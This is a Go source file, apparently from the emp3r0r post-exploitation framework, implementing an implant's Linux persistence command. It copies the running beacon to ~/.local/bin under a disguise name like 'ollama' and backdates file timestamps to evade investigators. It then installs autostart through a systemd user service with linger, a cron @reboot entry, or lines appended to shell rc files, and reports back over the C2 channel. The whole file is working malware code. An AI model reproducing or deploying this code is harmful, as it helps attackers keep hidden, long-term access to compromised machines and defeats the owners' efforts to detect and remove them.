//go:build linux
// +build linux

// Package handler — persist_linux.go
//
// !persist — explicit, operator-ordered persistence. NEVER automatic:
// a persistence artifact is a static IoC and the default posture is
// memory-only (memfd) with the disk build deleted at startup. When the
// operator decides a foothold is worth keeping, this installs user-level
// (no-root) autostart under the SAME cover identity the process already
// runs as — an "ollama.service" starting ~/.local/bin/ollama serve looks
// like a local-LLM daemon, not a beacon.
//
// Mechanisms, in auto-preference order:
//  1. systemd user service   — survives reboot AND crash (Restart=on-failure)
//  2. cron @reboot           — survives reboot, no crash restart
//  3. shell rc (bash/zsh)    — survives reboot only on interactive logins
package handler

import (
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// persistMarker identifies artifacts this module owns (cron/rc comments,
// unit Description) so status/remove only ever touch our own lines.
const persistMarker = "ai-agent autostart"

type persistMechanism struct {
	Name    string
	Install func(binPath string, argv []string) (string, error)
	Status  func(binPath string) (bool, string)
	Remove  func(binPath string) error
}

// homeDir returns $HOME, falling back to os.UserHomeDir.
func persistHome() (string, error) {
	if h := os.Getenv("HOME"); h != "" {
		return h, nil
	}
	return os.UserHomeDir()
}

// dropPersistCopy materializes the running image (memfd or disk) at
// ~/.local/bin/<cover-name> with backdated timestamps, and returns its path.
func dropPersistCopy() (string, error) {
	home, err := persistHome()
	if err != nil {
		return "", fmt.Errorf("no home dir: %v", err)
	}
	name := dropPersistName
	if name == "" {
		name = agentutils.MasqueradeName()
	}
	if name == "" {
		name = "ollama" // fallback cover name
	}
	binDir := filepath.Join(home, ".local", "bin")
	if err := os.MkdirAll(binDir, 0o755); err != nil {
		return "", err
	}
	binPath := filepath.Join(binDir, name)

	// read the running image (memfd works fine via /proc/self/exe);
	// persistSelfImage is the injectable source (tests swap it)
	self, err := readSelfImage()
	if err != nil {
		return "", fmt.Errorf("read /proc/self/exe: %v", err)
	}
	// Collision guard: the cover name may be a REAL tool the user actually
	// runs (claude/codex are common in ~/.local/bin). Overwriting someone's
	// live CLI is unacceptable — refuse unless the existing bytes ARE our
	// own image (a previous persist of this very identity).
	if existing, err := os.ReadFile(binPath); err == nil {
		if string(existing) != string(self) {
			if !forceDrop {
				return "", fmt.Errorf("%s already exists and is not our image — refusing to overwrite a real tool; use --force to override", binPath)
			}
			logging.Debugf("persist: --force: overwriting %s", binPath)
		} else {
			// already our image — idempotent skip (avoid I/O + timestamp churn)
			return binPath, nil
		}
	}
	if err := os.WriteFile(binPath, self, 0o755); err != nil {
		return "", err
	}
	// timestomping: an "old" local tool draws less eyes than a fresh file
	util.BackdateFile(binPath, 20, 180)
	util.BackdateFile(binDir, 20, 180)
	return binPath, nil
}

func persistSystemdUnitPath(name string) (string, error) {
	home, err := persistHome()
	if err != nil {
		return "", err
	}
	return filepath.Join(home, ".config", "systemd", "user", name+".service"), nil
}

// systemctlUserEnv returns the standard user-session environment for
// systemctl --user. SSH-spawned processes often lack DBUS_SESSION_BUS_ADDRESS
// and XDG_RUNTIME_DIR; without them systemd-user persistence reports a false
// negative even on perfectly healthy targets.
func systemctlUserEnv() []string {
	uid := os.Getuid()
	runtimeDir := fmt.Sprintf("/run/user/%d", uid)
	extra := []string{
		"XDG_RUNTIME_DIR=" + runtimeDir,
		"DBUS_SESSION_BUS_ADDRESS=unix:path=" + runtimeDir + "/bus",
	}
	has := func(prefix string) bool {
		for _, e := range os.Environ() {
			if strings.HasPrefix(e, prefix+"=") {
				return true
			}
		}
		return false
	}
	var env []string
	if !has("XDG_RUNTIME_DIR") {
		env = append(env, extra[0])
	}
	if !has("DBUS_SESSION_BUS_ADDRESS") {
		env = append(env, extra[1])
	}
	return env
}

// enableLinger turns on systemd --user at boot for the current user.
// Without linger the user manager (and every user unit) only starts after
// an interactive login — which never happens on headless targets, making
// the systemd mechanism a no-op exactly where it matters most. Idempotent.
func enableLinger() (bool, error) {
	u, err := user.Current()
	if err != nil {
		return false, err
	}
	if _, err := os.Stat("/var/lib/systemd/linger/" + u.Username); err == nil {
		return true, nil // already lingering
	}
	if _, err := util.RunCmdOutput("loginctl", "enable-linger", u.Username); err != nil {
		return false, err
	}
	_, err = os.Stat("/var/lib/systemd/linger/" + u.Username)
	return err == nil, err
}

// lingerState renders the boot-behavior caveat for install/status output.
func lingerState() string {
	u, err := user.Current()
	if err != nil {
		return "linger=unknown"
	}
	if _, err := os.Stat("/var/lib/systemd/linger/" + u.Username); err == nil {
		return "linger=on (autostart at boot, no login needed)"
	}
	return "linger=off (fires after first login only)"
}

// systemctlUser runs `systemctl --user ...` with the standard user-session
// environment injected.
func systemctlUser(args ...string) (string, error) {
	full := append([]string{"systemctl", "--user"}, args...)
	cmd := util.Command(full...)
	cmd.Env = append(os.Environ(), systemctlUserEnv()...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func persistSystemdInstall(binPath string, argv []string) (string, error) {
	if _, err := os.Stat("/run/systemd/system"); err != nil {
		return "", fmt.Errorf("systemd not running")
	}
	name := filepath.Base(binPath)
	unitPath, err := persistSystemdUnitPath(name)
	if err != nil {
		return "", err
	}
	if err := os.MkdirAll(filepath.Dir(unitPath), 0o755); err != nil {
		return "", err
	}
	unit := fmt.Sprintf(`[Unit]
Description=%s user service (%s)
After=network-online.target

[Service]
ExecStart=%s %s
Restart=on-failure
RestartSec=%d
StartLimitBurst=5
StartLimitIntervalSec=600

[Install]
WantedBy=default.target
`, name, persistMarker, binPath, strings.Join(argv[1:], " "), util.RandInt(20, 90))
	if err := os.WriteFile(unitPath, []byte(unit), 0o644); err != nil {
		return "", err
	}
	util.BackdateFile(unitPath, 20, 180)
	// Atomicity: a failed daemon-reload/enable must not leave a half-installed
	// unit file behind — persistSystemdStatus is file-existence based, so a
	// leftover file would report a ghost install (drill-caught). Clean up on
	// any failure before the unit is actually enabled.
	cleanup := func() {
		_ = os.Remove(unitPath)
		_, _ = systemctlUser("daemon-reload")
	}
	// enable + start; --now so the operator sees it working immediately
	if out, err := systemctlUser("daemon-reload"); err != nil {
		cleanup()
		return "", fmt.Errorf("daemon-reload: %v: %s", err, strings.TrimSpace(out))
	}
	if out, err := systemctlUser("enable", name+".service"); err != nil {
		cleanup()
		return "", fmt.Errorf("enable: %v: %s", err, strings.TrimSpace(out))
	}
	// headless survival: linger must be on for the unit to fire at boot
	lingerOn, lingerErr := enableLinger()
	// --now may fail if the session bus is unreachable from this shell; the
	// unit still autostarts at login/boot, so only warn
	if out, err := systemctlUser("start", name+".service"); err != nil {
		logging.Debugf("systemctl --user start: %v: %s", err, strings.TrimSpace(out))
	}
	// health check: wait briefly for the unit to reach a real state
	healthOk, healthState := false, "unknown"
	for i := 0; i < 3; i++ {
		out, err := systemctlUser("is-active", name+".service")
		state := strings.TrimSpace(out)
		if err == nil && state == "active" {
			healthOk, healthState = true, state
			break
		}
		if state == "failed" || state == "inactive" {
			healthState = state
			break
		}
		healthState = state
		time.Sleep(2 * time.Second)
	}
	lingerText := "linger=off (WARNING: fires after first login only — headless boot will NOT start it)"
	if lingerOn {
		lingerText = "linger=on (autostart at boot, no login needed)"
	} else if lingerErr != nil {
		lingerText = "linger=FAILED (" + lingerErr.Error() + ") — fires after first login only"
	}
	healthText := "health=not-running"
	if healthOk {
		healthText = "health=running"
	} else if healthState == "failed" {
		healthText = "health=failed (ExecStart returned error)"
	} else if healthState == "activating" || healthState == "reloading" {
		healthText = "health=" + healthState + " (waiting for start)"
	}
	return fmt.Sprintf("systemd user unit %s enabled; %s; %s", unitPath, lingerText, healthText), nil
}

func persistSystemdStatus(binPath string) (bool, string) {
	name := filepath.Base(binPath)
	unitPath, err := persistSystemdUnitPath(name)
	if err != nil || !util.IsExist(unitPath) {
		return false, ""
	}
	return true, unitPath + " — " + lingerState()
}

func persistSystemdRemove(binPath string) error {
	// remove the specific unit if binPath is known
	if binPath != "" {
		name := filepath.Base(binPath)
		_, _ = util.RunCmdOutput("systemctl", "--user", "disable", "--now", name+".service")
		unitPath, err := persistSystemdUnitPath(name)
		if err == nil {
			_ = os.Remove(unitPath)
		}
	}
	// also scan for any orphaned units with our marker
	home, herr := persistHome()
	if herr == nil {
		udir := filepath.Join(home, ".config", "systemd", "user")
		entries, _ := os.ReadDir(udir)
		for _, e := range entries {
			if !strings.HasSuffix(e.Name(), ".service") {
				continue
			}
			full := filepath.Join(udir, e.Name())
			data, err := os.ReadFile(full)
			if err != nil {
				continue
			}
			if strings.Contains(string(data), persistMarker) {
				staleName := strings.TrimSuffix(e.Name(), ".service")
				_, _ = util.RunCmdOutput("systemctl", "--user", "disable", "--now", e.Name())
				os.Remove(full)
				if staleName != filepath.Base(binPath) {
					logging.Debugf("persist: removed orphaned unit %s", e.Name())
				}
			}
		}
	}
	_, _ = util.RunCmdOutput("systemctl", "--user", "daemon-reload")
	return nil
}

func persistCronLine(binPath string, argv []string) string {
	return fmt.Sprintf("@reboot %s %s >/dev/null 2>&1 %s",
		binPath, strings.Join(argv[1:], " "), "# "+persistMarker)
}

func persistCronInstall(binPath string, argv []string) (string, error) {
	if _, err := os.Stat("/usr/bin/crontab"); err != nil {
		if _, err2 := os.Stat("/usr/sbin/crontab"); err2 != nil {
			return "", fmt.Errorf("crontab not found")
		}
	}
	line := persistCronLine(binPath, argv)
	out, err := util.RunCmdOutput("crontab", "-l")
	existing := ""
	if err == nil {
		existing = out
	}
	if strings.Contains(existing, binPath+" ") {
		return "", fmt.Errorf("cron entry already present")
	}
	newTab := strings.TrimRight(existing, "\n")
	if newTab != "" {
		newTab += "\n"
	}
	newTab += line + "\n"
	cmd := util.Command("crontab", "-")
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return "", err
	}
	if err := cmd.Start(); err != nil {
		return "", err
	}
	_, _ = stdin.Write([]byte(newTab))
	_ = stdin.Close()
	if err := cmd.Wait(); err != nil {
		return "", fmt.Errorf("crontab install: %v", err)
	}
	return "cron @reboot entry installed", nil
}

func persistCronStatus(binPath string) (bool, string) {
	out, err := util.RunCmdOutput("crontab", "-l")
	if err != nil {
		return false, ""
	}
	for _, l := range strings.Split(out, "\n") {
		if strings.Contains(l, binPath+" ") {
			return true, strings.TrimSpace(l)
		}
	}
	return false, ""
}

func persistCronRemove(binPath string) error {
	out, err := util.RunCmdOutput("crontab", "-l")
	if err != nil {
		return nil // no crontab — nothing to remove
	}
	var kept []string
	for _, l := range strings.Split(out, "\n") {
		// remove any line with our marker (handles orphaned entries from
		// previous cover names, not just the current binPath)
		if strings.Contains(l, persistMarker) {
			continue
		}
		kept = append(kept, l)
	}
	newTab := strings.TrimRight(strings.Join(kept, "\n"), "\n")
	if newTab == "" {
		_ = util.Command("crontab", "-r").Run()
		return nil
	}
	cmd := util.Command("crontab", "-")
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}
	if err := cmd.Start(); err != nil {
		return err
	}
	_, _ = stdin.Write([]byte(newTab + "\n"))
	_ = stdin.Close()
	return cmd.Wait()
}

// persistShellRCs returns the shell rc files worth hooking, existing ones first.
func persistShellRCs() []string {
	home, err := persistHome()
	if err != nil {
		return nil
	}
	return []string{
		filepath.Join(home, ".bashrc"),
		filepath.Join(home, ".zshrc"),
		filepath.Join(home, ".profile"),
	}
}

func persistShellrcInstall(binPath string, argv []string) (string, error) {
	line := fmt.Sprintf("%s %s >/dev/null 2>&1 & %s",
		binPath, strings.Join(argv[1:], " "), "# "+persistMarker)
	var touched []string
	for _, rc := range persistShellRCs() {
		content := ""
		if b, err := os.ReadFile(rc); err == nil {
			content = string(b)
		}
		if strings.Contains(content, binPath+" ") {
			continue
		}
		f, err := os.OpenFile(rc, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
		if err != nil {
			continue
		}
		if content != "" && !strings.HasSuffix(content, "\n") {
			f.WriteString("\n")
		}
		_, werr := f.WriteString(line + "\n")
		f.Close()
		if werr == nil {
			util.BackdateFile(rc, 20, 180)
			touched = append(touched, rc)
		}
	}
	if len(touched) == 0 {
		return "", fmt.Errorf("no rc file writable")
	}
	return fmt.Sprintf("shell rc hook in %s", strings.Join(touched, ", ")), nil
}

func persistShellrcStatus(binPath string) (bool, string) {
	for _, rc := range persistShellRCs() {
		if b, err := os.ReadFile(rc); err == nil {
			for _, l := range strings.Split(string(b), "\n") {
				if strings.Contains(l, binPath+" ") {
					return true, fmt.Sprintf("%s: %s", rc, strings.TrimSpace(l))
				}
			}
		}
	}
	return false, ""
}

func persistShellrcRemove(binPath string) error {
	for _, rc := range persistShellRCs() {
		b, err := os.ReadFile(rc)
		if err != nil {
			continue
		}
		var kept []string
		changed := false
		for _, l := range strings.Split(string(b), "\n") {
			// remove any line with our marker (handles orphaned entries)
			if strings.Contains(l, persistMarker) {
				changed = true
				continue
			}
			kept = append(kept, l)
		}
		if changed {
			if err := os.WriteFile(rc, []byte(strings.Join(kept, "\n")), 0o644); err != nil {
				return err
			}
		}
	}
	return nil
}

var persistMechanisms = []persistMechanism{
	{Name: "systemd", Install: persistSystemdInstall, Status: persistSystemdStatus, Remove: persistSystemdRemove},
	{Name: "cron", Install: persistCronInstall, Status: persistCronStatus, Remove: persistCronRemove},
	{Name: "shellrc", Install: persistShellrcInstall, Status: persistShellrcStatus, Remove: persistShellrcRemove},
}

// persistBinPath returns the dropped-copy path if one exists, "" otherwise.
func persistBinPath() string {
	home, err := persistHome()
	if err != nil {
		return ""
	}
	name := agentutils.MasqueradeName()
	if name == "" {
		name = "ollama"
	}
	p := filepath.Join(home, ".local", "bin", name)
	if util.IsExist(p) {
		return p
	}
	return ""
}

func runPersist(cmd *cobra.Command, args []string) {
	if runtime.GOOS != "linux" {
		c2transport.NotifyC2(cmd, "Error: !persist is Linux-only")
		return
	}
	action := "status"
	if len(args) > 0 {
		action = args[0]
	}
	method, _ := cmd.Flags().GetString("method")
	allMechs, _ := cmd.Flags().GetBool("all")
	force, _ := cmd.Flags().GetBool("force")
	forceDrop = force

	switch action {
	case "install":
		binPath, err := dropPersistCopy()
		if err != nil {
			c2transport.NotifyC2(cmd, "Error: drop copy: %v", err)
			return
		}
		argv := agentutils.MasqueradeArgv(binPath)
		var installed []string
		tryOrder := persistMechanisms
		if method != "" && method != "auto" {
			tryOrder = nil
			for _, m := range persistMechanisms {
				if m.Name == method {
					tryOrder = []persistMechanism{m}
				}
			}
			if tryOrder == nil {
				c2transport.NotifyC2(cmd, "Error: unknown method %q (auto|systemd|cron|shellrc)", method)
				return
			}
		}
		for _, m := range tryOrder {
			if ok, _ := m.Status(binPath); ok && !allMechs {
				installed = append(installed, fmt.Sprintf("%s: already installed", m.Name))
				if method == "" || method == "auto" {
					break // auto mode: already present counts as success
				}
				continue
			}
			res, err := m.Install(binPath, argv)
			if err != nil {
				logging.Debugf("persist: %s: %v", m.Name, err)
				continue
			}
			installed = append(installed, fmt.Sprintf("%s: %s", m.Name, res))
			if (method == "" || method == "auto") && !allMechs {
				break // auto mode: first success wins
			}
		}
		if len(installed) == 0 {
			c2transport.NotifyC2(cmd, "Error: no persistence mechanism succeeded (binary dropped at %s)", binPath)
			return
		}
		c2transport.NotifyC2(cmd, "Persisted as %q:\n  - %s", filepath.Base(binPath), strings.Join(installed, "\n  - "))

	case "remove":
		binPath := persistBinPath()
		var removed []string
		// clean ALL marked entries across all mechanisms (handles orphaned
		// entries from previous cover names)
		for _, m := range persistMechanisms {
			if err := m.Remove(binPath); err != nil {
				removed = append(removed, fmt.Sprintf("%s: remove failed: %v", m.Name, err))
				continue
			}
			removed = append(removed, m.Name)
		}
		// always remove the binary if it exists
		if binPath != "" {
			if err := os.Remove(binPath); err == nil {
				removed = append(removed, fmt.Sprintf("binary %s", binPath))
			}
		} else {
			// no current binPath — try to find and clean any stale copy
			if home, err := persistHome(); err == nil {
				binDir := filepath.Join(home, ".local", "bin")
				entries, _ := os.ReadDir(binDir)
				for _, e := range entries {
					p := filepath.Join(binDir, e.Name())
					if data, err := os.ReadFile(p); err == nil && strings.Contains(string(data), persistMarker) {
						os.Remove(p)
						removed = append(removed, fmt.Sprintf("stale binary %s", p))
					}
				}
			}
		}
		if len(removed) == 0 {
			c2transport.NotifyC2(cmd, "No persistence found")
			return
		}
		c2transport.NotifyC2(cmd, "Removed: %s", strings.Join(removed, ", "))

	default: // status
		var lines []string
		if binPath := persistBinPath(); binPath != "" {
			lines = append(lines, fmt.Sprintf("copy: %s", binPath))
			for _, m := range persistMechanisms {
				if ok, detail := m.Status(binPath); ok {
					lines = append(lines, fmt.Sprintf("%s: %s", m.Name, detail))
				}
			}
		} else {
			lines = append(lines, "no persistence installed")
		}
		c2transport.NotifyC2(cmd, "%s", strings.Join(lines, "\n"))
	}
}

// readSelfImage returns the running image bytes; var for test injection.
var readSelfImage = func() ([]byte, error) {
	return os.ReadFile("/proc/self/exe")
}

// dropPersistName overrides the cover name for the persist copy (tests);
// empty = the live masquerade identity.
var dropPersistName string

// forceDrop bypasses the collision guard (--force flag).
var forceDrop bool

// dropPersistCopyNamed runs dropPersistCopy under an explicit cover name.
func dropPersistCopyNamed(name string) (string, error) {
	old := dropPersistName
	dropPersistName = name
	defer func() { dropPersistName = old }()
	return dropPersistCopy()
}
